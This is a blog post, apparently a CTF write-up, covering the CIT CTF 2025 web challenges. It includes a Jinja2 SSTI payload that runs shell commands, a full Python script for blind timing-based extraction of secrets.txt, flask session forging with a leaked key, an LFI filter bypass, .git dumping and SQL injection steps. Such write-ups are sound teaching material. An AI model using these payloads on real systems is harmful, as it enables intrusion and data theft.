@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>[CIT CTF 2025] Solving all Web challenges | @MindPatch</title>
+<meta name="keywords" content="CTF, web security, SSTI, LFI, SQL injection, git enumeration, flask">
+<meta name="description" content="Complete writeup for all web challenges from CIT CTF 2025, including SSTI exploitation, LFI bypasses, git repository enumeration, and SQL injection techniques.">
+<meta name="author" content="MindPatch">
+<link rel="canonical" href="http://localhost:1313/posts/my-first-post/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/my-first-post/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="@MindPatch (Alt + H)">@MindPatch</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      [CIT CTF 2025] Solving all Web challenges
+    </h1>
+    <div class="post-description">
+      Complete writeup for all web challenges from CIT CTF 2025, including SSTI exploitation, LFI bypasses, git repository enumeration, and SQL injection techniques.
+    </div>
+    <div class="post-meta"><span title='2025-04-28 00:00:00 +0000 UTC'>April 28, 2025</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;MindPatch
+
+</div>
+  </header> 
+  <div class="post-content"><p>Hello, I joined the CTF for fun during the weekend.</p>
+<p>I focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.</p>
+<h2 id="mr-chatbot">Mr. Chatbot<a hidden class="anchor" aria-hidden="true" href="#mr-chatbot">#</a></h2>
+<p><img alt="Mr. Chatbot Challenge" loading="lazy" src="https://miro.medium.com/v2/resize:fit:952/1*kvW3lucpnNq6fTtQ9Y_BBA.png"></p>
+<p>The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn&rsquo;t an LLM attack — responses came from JavaScript files.</p>
+<p><img alt="Chat Interface" loading="lazy" src="https://miro.medium.com/v2/resize:fit:952/1*RXw88Zwtk6JNglc_pSVzTQ.png"></p>
+<p>After entering a name, you get a session value that can be decoded with flask-unsign:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ flask-unsign --unsign --cookie <span style="color:#e6db74">&#34;eyJhZG1pbiI6IjAiLCJuYW1lIjoiaGFja2VyIn0.aA8u-Q.GRwPzCvfn4k_zUDDzo_XL83fKJk&#34;</span> --secret<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;9f3IC3uj9^zZ&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Session decodes to: <span style="color:#f92672">{</span><span style="color:#e6db74">&#39;admin&#39;</span>: <span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;name&#39;</span>: <span style="color:#e6db74">&#39;hacker&#39;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><img alt="Session Decoding" loading="lazy" src="https://miro.medium.com/v2/resize:fit:952/1*lZwyPZ9_OqenlmQWuCAssg.png"></p>
+<p>After trying injections with no luck, I did parameter fuzzing and found the <code>admin=1</code> parameter. This revealed new session data:</p>
+<p><img alt="Admin Parameter" loading="lazy" src="https://miro.medium.com/v2/resize:fit:667/1*1TuqK6xE0XGYJz-DQD50oQ.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ flask-unsign --unsign --cookie <span style="color:#e6db74">&#34;.eJwdzE0LgjAAxvHvsksEHVoJUdEpe7M2C2S63cyJTacIFprRd--x2397ftuHxLo0FVkRSiakissUmT6TOm6aVo_G63GGO43tZTSmy0xM5XvZyoj3enarzkFjzqF-3ENRSCNz1heL6PiwzHaO7LMaXfJ956hwn6QHUVzQfqDQrL3SbjpYTmFzL0ndguKc822NfUe5Haz2omPWMfpvGJsrtAoEzMmBNwpOuXZ4M4d1fAEb_v-be4b1ftBsyPcHZ6hN0g.aAwwvA.ouiTuVJ131_fQmyqYgewMTM-ZlM&#34;</span> --secret<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;9f3IC3uj9^zZ&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Session decodes to: <span style="color:#f92672">{</span><span style="color:#e6db74">&#39;admin&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">&#39;name&#39;</span>: <span style="color:#e6db74">&#34;hacker&#34;</span>, <span style="color:#e6db74">&#39;uid&#39;</span>: <span style="color:#e6db74">&#39;L2V0Yy9wYXNzd2QnKTsiKWdhbWVkYiYjMzk7XHhlMlx4YzgpXHhmNFx4ZWFceGVkLFx4OTZceGMwP1x0XHhlN1x4YjJceDk1XHhjNCpceGE1Nlx4OTdJXHgxM1x4OTdceDljZ1x4ZTVceGI4XHhiZlx4ZDlceGE3XHg4OVx4OWJceDk3JiMzOTs=&#39;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>As you see there&rsquo;s a new variable (<strong>UID</strong>), I tried doing some injections like SSTI and got it :)</p>
+<p><img alt="SSTI Success" loading="lazy" src="https://miro.medium.com/v2/resize:fit:667/1*GdcyUtROwNfXlDF7_ViIVw.png"></p>
+<p>Well The idea now to get <strong>secrets.txt</strong> file blindly, I wrote a script that uses <strong>head</strong> command if char is valid then sleep 5 seconds</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CHARS <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>printable
+</span></span><span style="display:flex;"><span>FOUND <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>POSITION <span style="color:#f92672">=</span> len(FOUND) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_payload</span>(position, the_char):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Use a simple command to compare single character</span>
+</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[ &#34;$(head -c </span><span style="color:#e6db74">{</span>position<span style="color:#e6db74">}</span><span style="color:#e6db74"> secrets.txt | tail -c 1)&#34; = &#34;</span><span style="color:#e6db74">{</span>the_char<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; ] &amp;&amp; sleep 5&#39;</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;&#34;</span><span style="color:#f92672">+</span>cmd<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#39;).read() }}&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> FOUND, POSITION
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Continue until we&#39;ve found enough characters or need to stop</span>
+</span></span><span style="display:flex;"><span>    max_positions <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>  <span style="color:#75715e"># Set a reasonable limit</span>
+</span></span><span style="display:flex;"><span>    consecutive_spaces <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>  <span style="color:#75715e"># Track consecutive spaces to detect end of file</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> POSITION <span style="color:#f92672">&lt;=</span> max_positions <span style="color:#f92672">and</span> consecutive_spaces <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span>:  <span style="color:#75715e"># Stop after 5 consecutive spaces</span>
+</span></span><span style="display:flex;"><span>        found_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ch <span style="color:#f92672">in</span> CHARS:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ch <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;$&#39;</span>, <span style="color:#e6db74">&#39;&amp;&#39;</span>, <span style="color:#e6db74">&#39;|&#39;</span>, <span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span>]:  <span style="color:#75715e"># Skip problematic chars</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Position </span><span style="color:#e6db74">{</span>POSITION<span style="color:#e6db74">}</span><span style="color:#e6db74">, trying character: </span><span style="color:#e6db74">{</span>ch<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            start_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;http://23.179.17.40:58005/&#34;</span>, 
+</span></span><span style="display:flex;"><span>                    allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, 
+</span></span><span style="display:flex;"><span>                    data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;name&#34;</span>: make_payload(POSITION, ch), <span style="color:#e6db74">&#34;admin&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>},
+</span></span><span style="display:flex;"><span>                    proxies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;http&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:8080&#34;</span>},
+</span></span><span style="display:flex;"><span>                    timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                elapsed_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">-</span> start_time
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> elapsed_time <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">4.5</span>:  <span style="color:#75715e"># Slightly lower threshold to account for network variability</span>
+</span></span><span style="display:flex;"><span>                    FOUND <span style="color:#f92672">+=</span> ch
+</span></span><span style="display:flex;"><span>                    found_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e"># Reset consecutive spaces counter if we found a non-space</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> ch <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39; &#39;</span>:
+</span></span><span style="display:flex;"><span>                        consecutive_spaces <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                        consecutive_spaces <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>                        
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found character at position </span><span style="color:#e6db74">{</span>POSITION<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>ch<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Current secret: </span><span style="color:#e6db74">{</span>FOUND<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>Timeout:
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># If timeout occurs, the character matched</span>
+</span></span><span style="display:flex;"><span>                FOUND <span style="color:#f92672">+=</span> ch
+</span></span><span style="display:flex;"><span>                found_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># Reset consecutive spaces counter if we found a non-space</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> ch <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39; &#39;</span>:
+</span></span><span style="display:flex;"><span>                    consecutive_spaces <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                    consecutive_spaces <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found character at position </span><span style="color:#e6db74">{</span>POSITION<span style="color:#e6db74">}</span><span style="color:#e6db74"> (timeout): </span><span style="color:#e6db74">{</span>ch<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Current secret: </span><span style="color:#e6db74">{</span>FOUND<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error with character </span><span style="color:#e6db74">{</span>ch<span style="color:#e6db74">}</span><span style="color:#e6db74"> at position </span><span style="color:#e6db74">{</span>POSITION<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> found_char:
+</span></span><span style="display:flex;"><span>            FOUND <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; &#34;</span>
+</span></span><span style="display:flex;"><span>            consecutive_spaces <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;No character found at position </span><span style="color:#e6db74">{</span>POSITION<span style="color:#e6db74">}</span><span style="color:#e6db74">, adding space and continuing&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Current secret: </span><span style="color:#e6db74">{</span>FOUND<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Consecutive spaces: </span><span style="color:#e6db74">{</span>consecutive_spaces<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        POSITION <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Starting blind exploitation from existing credentials: </span><span style="color:#e6db74">{</span>FOUND<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Starting at position: </span><span style="color:#e6db74">{</span>POSITION<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    exploit()
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Final extracted secret: </span><span style="color:#e6db74">{</span>FOUND<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>And after running it got the flag :)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python exp.py
+</span></span><span style="display:flex;"><span>admin:9f3IC3uj9^zZ  CIT<span style="color:#f92672">{</span>18a7fbedb4f3548f<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="how-i-parsed-your-json">How I Parsed your JSON<a hidden class="anchor" aria-hidden="true" href="#how-i-parsed-your-json">#</a></h2>
+<p>This challenge reads JSON files locally and provides a SQL-like syntax to extract data. You can add <code>*</code> to the query to extract all columns.</p>
+<p>The useful finding was converting the <code>container</code> parameter into a list with <code>?container[]=</code>. This showed a debug page with source code.</p>
+<p><img alt="Debug Page" loading="lazy" src="https://miro.medium.com/v2/resize:fit:667/1*HpShJFda_vKXHxW6UGpBfA.png"></p>
+<p>The code simply removes <code>../</code> and file extensions from the container name to prevent LFI. This can be bypassed with <code>..//file.txt.txt</code>.</p>
+<pre tabindex="0"><code>/select?record=*&amp;container=../../../..//app//secrets.txt.txt
+</code></pre><p><img alt="LFI Bypass Result" loading="lazy" src="https://miro.medium.com/v2/resize:fit:667/1*KhKFV2iS03LRGP23UU74KA.png"></p>
+<h2 id="commit--order-version-control-unit">Commit &amp; Order: Version Control Unit<a hidden class="anchor" aria-hidden="true" href="#commit--order-version-control-unit">#</a></h2>
+<p>This challenge was straightforward. I discovered an exposed <code>/.git</code> directory on the server and dumped the repository using the git-dump tool.</p>
+<p>After examining the commit history, I found older commits that contained the source code with hardcoded admin credentials. This is a common security mistake where developers remove sensitive information in later commits but forget that the data remains accessible in the Git history.</p>
+<p>The steps to solve were:</p>
+<ol>
+<li>Identify the exposed Git repository at <code>/.git</code></li>
+<li>Download the repository using git-dump</li>
+<li>Review commit history with <code>git log</code></li>
+<li>Check older commits with <code>git show [commit-hash]</code></li>
+<li>Find the source code file containing the hardcoded admin password in admin.php</li>
+<li>Use the credentials to access the admin panel and retrieve the flag</li>
+</ol>
+<h2 id="breaking-authentication">Breaking Authentication<a hidden class="anchor" aria-hidden="true" href="#breaking-authentication">#</a></h2>
+<p>This challenge featured a straightforward SQL injection vulnerability in the login page.</p>
+<p>Steps to solve:</p>
+<ol>
+<li>Accessed the database and dumped its contents</li>
+<li>Found the flag stored in the &lsquo;secrets&rsquo; table</li>
+</ol>
+<p>Classic example of an unsanitized input field allowing SQL injection to compromise a web application&rsquo;s authentication mechanism.</p>
+<h2 id="keeping-up-with-the-credentials">Keeping Up with the Credentials<a hidden class="anchor" aria-hidden="true" href="#keeping-up-with-the-credentials">#</a></h2>
+<p>This challenge required first solving another challenge to obtain valid username and password credentials.</p>
+<p>Steps to solve:</p>
+<ol>
+<li>Used credentials obtained from the previous challenge to log in</li>
+<li>After login, got redirected to <code>/debug.php</code> which was an empty page</li>
+<li>Noticed that accessing <code>/admin.php</code> directly would automatically log you out</li>
+<li>Modified the login request to include the parameter <code>admin=true</code> using POST method</li>
+<li>Successfully redirected to <code>/admin.php</code> with admin privileges</li>
+<li>Retrieved the flag from the admin page</li>
+</ol>
+<p>Pretty Simple :v</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/ctf/">CTF</a></li>
+      <li><a href="http://localhost:1313/tags/web-security/">Web Security</a></li>
+      <li><a href="http://localhost:1313/tags/ssti/">SSTI</a></li>
+      <li><a href="http://localhost:1313/tags/lfi/">LFI</a></li>
+      <li><a href="http://localhost:1313/tags/sql-injection/">SQL Injection</a></li>
+      <li><a href="http://localhost:1313/tags/git-enumeration/">Git Enumeration</a></li>
+      <li><a href="http://localhost:1313/tags/flask/">Flask</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">@MindPatch</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
